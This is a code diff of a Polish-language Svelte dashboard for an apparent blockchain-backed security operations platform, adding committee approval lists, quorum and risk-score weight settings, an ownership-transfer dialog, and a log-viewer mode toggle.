+              {#if pendingProposals.filter(p => !p.executed).length > 0}
+                <div style="margin-top: 8px;">
+                  <h4 style="margin: 0 0 12px 0; font-size: 14px; color: #f87171; display: flex; align-items: center; gap: 6px;">
+                    <span style="width: 8px; height: 8px; background: #f87171; border-radius: 50%; box-shadow: 0 0 8px #f87171;"></span>
+                    Oczekujące Akcje Krytyczne (Wymagany Podpis Komitetu)
+                  </h4>
+                  <div style="display: flex; flex-direction: column; gap: 8px;">
+                    {#each pendingProposals.filter(p => !p.executed) as prop}
+                      <div style="background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(248, 113, 113, 0.15); border-radius: 8px; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center;">
+                        <div style="display: flex; flex-direction: column; gap: 4px;">
+                          <div style="display: flex; align-items: center; gap: 8px;">
+                            <span style="font-weight: 700; color: #e2e8f0; font-size: 13px;">{prop.action}</span>
+                            <span style="color: #94a3b8; font-size: 12px;">| Cel: <span style="font-family: monospace; color: #38bdf8;">{prop.target}</span></span>
+                          </div>
+                          <div style="color: #64748b; font-size: 11px;">
+                            Zaproponowane przez {prop.proposer} ({prop.time})
+                          </div>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 16px;">
+                          <div style="text-align: right;">
+                            <div style="font-size: 14px; font-weight: 700; color: #f87171;">{prop.approvals} / {prop.required}</div>
+                            <div style="font-size: 10px; color: #94a3b8; text-transform: uppercase;">Zatwierdzeń</div>
+                          </div>
+                          <button class="btn-primary" style="background: rgba(56, 189, 248, 0.1); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.3); padding: 8px 16px; font-size: 12px; font-weight: 600;" on:click={() => handleApproveProposal(prop.id)}>
+                            Zatwierdź Kluczem
+                          </button>
+                        </div>
+                      </div>
+                    {/each}
+                  </div>
+                </div>
+              {:else}
+                <div style="padding: 12px; text-align: center; background: rgba(16, 185, 129, 0.05); border: 1px solid rgba(16, 185, 129, 0.1); border-radius: 8px; color: #10b981; font-size: 13px; font-weight: 500;">
+                  Brak oczekujących akcji dla tej organizacji. Komitet jest zgodny.
+                </div>
+              {/if}
+
+              <!-- Ustawienia Progów Komitetów -->
+              <div style="margin-top: 16px; background: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 8px; padding: 16px;">
+                <h4 style="margin: 0 0 16px 0; font-size: 14px; color: #f1f5f9; display: flex; align-items: center; gap: 8px;">
+                  ⚖️ Wymagane podpisy (Quorum) dla Grup Komitetu
+                </h4>
+                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px;">
+                  <div style="display: flex; flex-direction: column; gap: 6px;">
+                    <label style="font-size: 12px; color: #94a3b8; font-weight: 600;">SOC_OPERATOR (Izolacje)</label>
+                    <input type="number" min="1" max="10" bind:value={thresholdOperator} style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #38bdf8; padding: 8px 12px; border-radius: 6px; font-weight: 700; width: 60px;" />
+                  </div>
+                  <div style="display: flex; flex-direction: column; gap: 6px;">
+                    <label style="font-size: 12px; color: #94a3b8; font-weight: 600;">POLICY_ADMIN (Reguły)</label>
+                    <input type="number" min="1" max="10" bind:value={thresholdPolicyAdmin} style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #10b981; padding: 8px 12px; border-radius: 6px; font-weight: 700; width: 60px;" />
+                  </div>
+                  <div style="display: flex; flex-direction: column; gap: 6px;">
+                    <label style="font-size: 12px; color: #94a3b8; font-weight: 600;">ADMIN_COMMITTEE (Krytyczne)</label>
+                    <input type="number" min="1" max="10" bind:value={thresholdAdminCommittee} style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #f59e0b; padding: 8px 12px; border-radius: 6px; font-weight: 700; width: 60px;" />
+                  </div>
+                </div>
+                <div style="display: flex; justify-content: flex-end; margin-top: 16px;">
+                  <button class="btn-primary" style="background: rgba(255, 255, 255, 0.1); color: #f1f5f9; border: 1px solid rgba(255, 255, 255, 0.2); padding: 8px 16px; font-size: 12px; font-weight: 600;" on:click={handleUpdateThresholds}>
+                    Zapisz Quorum (FIDO2)
+                  </button>
+                </div>
+              </div>
+
+              <!-- Ustawienia Punktacji Ryzyka (Risk Scoring) -->
+              <div style="margin-top: 16px; background: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 8px; padding: 16px;">
+                <h4 style="margin: 0 0 16px 0; font-size: 14px; color: #f1f5f9; display: flex; align-items: center; gap: 8px;">
+                  🎯 Punktacja Ryzyka i Próg Reakcji (XDR)
+                </h4>
+                <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px;">
+                  <div style="display: flex; flex-direction: column; gap: 6px;">
+                    <label style="font-size: 12px; color: #ef4444; font-weight: 700;">Próg Krytyczny (SOAR)</label>
+                    <input type="number" min="10" max="200" bind:value={riskThreshold} style="background: rgba(0,0,0,0.3); border: 1px solid rgba(239,68,68,0.3); color: #ef4444; padding: 8px 12px; border-radius: 6px; font-weight: 700; width: 60px;" />
+                  </div>
+                  <div style="display: flex; flex-direction: column; gap: 6px;">
+                    <label style="font-size: 12px; color: #94a3b8; font-weight: 600;">Reguła: Shell (Bash)</label>
+                    <input type="number" min="0" max="100" bind:value={ruleWeightBash} style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #e2e8f0; padding: 8px 12px; border-radius: 6px; font-weight: 700; width: 60px;" />
+                  </div>
+                  <div style="display: flex; flex-direction: column; gap: 6px;">
+                    <label style="font-size: 12px; color: #94a3b8; font-weight: 600;">Reguła: Nieznane IP</label>
+                    <input type="number" min="0" max="100" bind:value={ruleWeightNetwork} style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #e2e8f0; padding: 8px 12px; border-radius: 6px; font-weight: 700; width: 60px;" />
+                  </div>
+                  <div style="display: flex; flex-direction: column; gap: 6px;">
+                    <label style="font-size: 12px; color: #94a3b8; font-weight: 600;">Reguła: Zmiany FIM</label>
+                    <input type="number" min="0" max="100" bind:value={ruleWeightFim} style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #e2e8f0; padding: 8px 12px; border-radius: 6px; font-weight: 700; width: 60px;" />
+                  </div>
+                </div>
+                <div style="display: flex; justify-content: flex-end; margin-top: 16px;">
+                  <button class="btn-primary" style="background: rgba(255, 255, 255, 0.1); color: #f1f5f9; border: 1px solid rgba(255, 255, 255, 0.2); padding: 8px 16px; font-size: 12px; font-weight: 600;" on:click={handleUpdateRiskScoring}>
+                    Zapisz Punktację Polityk (FIDO2)
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- MODAL TRANSFERU WŁASNOŚCI -->
+            {#if showTransferOrgModal}
+              <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(4px); display: flex; align-items: center; justify-content: center; z-index: 9999;">
+                <div class="glass-panel" style="width: 450px; padding: 24px; border-radius: 16px; display: flex; flex-direction: column; gap: 20px;">
+                  <h3 style="margin: 0; color: #f87171; display: flex; align-items: center; gap: 8px;">⚠️ Ostrzeżenie: Transfer Własności</h3>
+                  <p style="font-size: 13px; color: #94a3b8; line-height: 1.5; margin: 0;">
+                    Przekazanie własności organizacji to akcja nieodwracalna. Tracisz wszystkie uprawnienia typu OWNER. Potwierdzenie wymaga podpisu kluczem sprzętowym.
+                  </p>
+                  <div style="display: flex; flex-direction: column; gap: 6px;">
+                    <label style="font-size: 12px; color: #64748b; font-weight: 600;">Adres portfela nowego właściciela (Sui Address):</label>
+                    <input type="text" bind:value={newOrgOwnerAddress} placeholder="0x..." style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #f1f5f9; padding: 10px; border-radius: 6px; font-family: monospace;" />
+                  </div>
+                  <div style="display: flex; justify-content: flex-end; gap: 12px; margin-top: 8px;">
+                    <button style="background: transparent; border: 1px solid rgba(255,255,255,0.1); color: #cbd5e1; padding: 10px 16px; border-radius: 8px; cursor: pointer;" on:click={() => showTransferOrgModal = false}>Anuluj</button>
+                    <button class="btn-primary" style="background: #ef4444; padding: 10px 16px; border-radius: 8px;" on:click={handleTransferOwnership}>Zatwierdź Kluczem</button>
+                  </div>
+                </div>
+              </div>
+            {/if}
 
             <!-- Smart Contract & Decentralized Storage Info Card -->
             <div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 18px; display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px;">
@@ -2521,12 +3030,12 @@
             <p style="margin: 0; font-size: 11px; font-weight: 600; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.08em;">2. Podaj dane rejestrowe dla weryfikacji:</p>
             <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
               <div style="display: flex; flex-direction: column; gap: 4px;">
-                <label style="font-size: 11px; color: #64748b;">{selectedRegion.taxId} {newOrgRegion === 'PL' ? '(10 cyfr)' : ''}:</label>
-                <input type="text" bind:value={newOrgTaxId} on:input={(e) => detectRegionFromVat(e.target.value)} placeholder="np. 7123501789" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px; font-family: monospace;" />
+                <label for="orgTaxId" style="font-size: 11px; color: #64748b;">{selectedRegion.taxId} {newOrgRegion === 'PL' ? '(10 cyfr)' : ''}:</label>
+                <input id="orgTaxId" type="text" bind:value={newOrgTaxId} on:input={(e) => detectRegionFromVat(e.target.value)} placeholder="np. 7123501789" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px; font-family: monospace;" />
               </div>
               <div style="display: flex; flex-direction: column; gap: 4px;">
-                <label style="font-size: 11px; color: #64748b;">Numer {selectedRegion.regId} {newOrgRegion === 'PL' ? '(10 cyfr)' : ''}:</label>
-                <input type="text" bind:value={newOrgRegId} placeholder="np. 0001199416" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px; font-family: monospace;" />
+                <label for="orgRegId" style="font-size: 11px; color: #64748b;">Numer {selectedRegion.regId} {newOrgRegion === 'PL' ? '(10 cyfr)' : ''}:</label>
+                <input id="orgRegId" type="text" bind:value={newOrgRegId} placeholder="np. 0001199416" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px; font-family: monospace;" />
               </div>
             </div>
             <button on:click={handleVerifyKRS} style="width: 100%; background: linear-gradient(135deg, #2563eb, #1d4ed8); border: none; border-radius: 8px; color: white; padding: 11px; font-size: 13px; font-weight: 600; cursor: pointer; transition: opacity 0.2s;" disabled={krsVerifyState === 'loading'}>
@@ -2555,12 +3064,12 @@
           <!-- Step 3: Org details -->
           <div style="display: flex; flex-direction: column; gap: 8px;">
             <div style="display: flex; flex-direction: column; gap: 4px;">
-              <label style="font-size: 11px; color: #94a3b8;">Nazwa podmiotu w systemie:</label>
-              <input type="text" bind:value={newOrgName} placeholder="np. ACME Spółka z o.o." style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px;" />
+              <label for="orgName" style="font-size: 11px; color: #94a3b8;">Nazwa podmiotu w systemie:</label>
+              <input id="orgName" type="text" bind:value={newOrgName} placeholder="np. ACME Spółka z o.o." style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px;" />
             </div>
             <div style="display: flex; flex-direction: column; gap: 4px;">
-              <label style="font-size: 11px; color: #94a3b8;">Skrót organizacyjny:</label>
-              <input type="text" bind:value={newOrgCode} placeholder="np. ACME" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px;" />
+              <label for="orgCode" style="font-size: 11px; color: #94a3b8;">Skrót organizacyjny:</label>
+              <input id="orgCode" type="text" bind:value={newOrgCode} placeholder="np. ACME" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px;" />
             </div>
           </div>
 
@@ -2722,10 +3231,28 @@
               >JSON-RPC 2.0</span
             >
           </h3>
-          <button class="close-btn" on:click={closeLogs}>✕</button>
+          <div style="display: flex; gap: 10px; align-items: center;">
+            <div class="view-toggle" style="display: flex; background: rgba(255,255,255,0.05); border-radius: 6px; padding: 4px;">
+              <button 
+                class={logsViewMode === 'raw' ? 'active' : ''} 
+                on:click={() => logsViewMode = 'raw'}
+                style="padding: 4px 12px; border: none; background: {logsViewMode === 'raw' ? 'rgba(59, 130, 246, 0.5)' : 'transparent'}; color: white; border-radius: 4px; cursor: pointer; font-size: 12px;"
+              >Surowe</button>
+              <button 
+                class={logsViewMode === 'tree' ? 'active' : ''} 
+                on:click={() => logsViewMode = 'tree'}
+                style="padding: 4px 12px; border: none; background: {logsViewMode === 'tree' ? 'rgba(16, 185, 129, 0.5)' : 'transparent'}; color: white; border-radius: 4px; cursor: pointer; font-size: 12px;"
+              >Drzewo Procesów</button>
+            </div>
+            <button class="close-btn" on:click={closeLogs}>✕</button>
+          </div>
         </div>
         <div class="modal-body">
-          <pre class="log-viewer">{liveLogs}</pre>
+          {#if logsViewMode === 'raw'}
+            <pre class="log-viewer">{@html formatRawLogs(liveLogs, true)}</pre>
+          {:else}
+            <pre class="log-viewer">{@html formatRawLogs(treeFormattedLogs, false)}</pre>
+          {/if}
         </div>
       </div>
     </div>
